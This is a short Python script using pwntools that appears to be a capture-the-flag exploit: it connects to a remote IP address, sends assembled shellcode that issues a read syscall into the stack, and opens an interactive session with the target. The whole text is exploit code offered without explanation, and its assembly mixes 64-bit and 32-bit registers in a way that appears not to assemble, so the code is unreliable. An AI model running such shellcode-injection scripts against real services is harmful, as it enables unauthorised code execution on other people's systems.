from pwn import *

s = remote('188.226.140.60', 10001)
dat = asm("""
  mov rdi, 0
  mov rsi, esp
  mov rax, 0
  mov edx, 100
  syscall
""")
s.recvuntil('execute:')
s.send(dat)
s.interactive()
